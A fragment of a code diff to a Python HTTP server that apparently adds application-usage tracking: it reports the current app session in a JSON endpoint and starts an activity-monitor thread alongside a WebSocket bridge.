+                    dur_str = f"{int(dur)}s (Đang dùng...)"
+                    data.insert(0, {
+                        "app": current_app_session["app"],
+                        "title": current_app_session["title"],
+                        "time": time.strftime('%H:%M:%S', time.localtime(current_app_session["start"])),
+                        "duration": dur_str,
+                        "active": True # Cờ đánh dấu đang active
+                    })
 
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
-            self.wfile.write(json.dumps(data_list).encode())
+            self.wfile.write(json.dumps(data).encode())
             return
         
         elif self.path == "/api/notify/zalo":
@@ -2125,6 +2271,9 @@ if __name__ == "__main__":
     # start ws bridge thread
     t = threading.Thread(target=ws_listen_thread, daemon=True)
     t.start()
+    t_act = threading.Thread(target=activity_monitor_task, daemon=True)
+    t_act.start()
+
     print("[MAIN] Started WS bridge thread (port {})".format(WS_PORT))
     print("\n--- STARTING WEBAPP (with built-in WS bridge) ---")
     run_http_server()
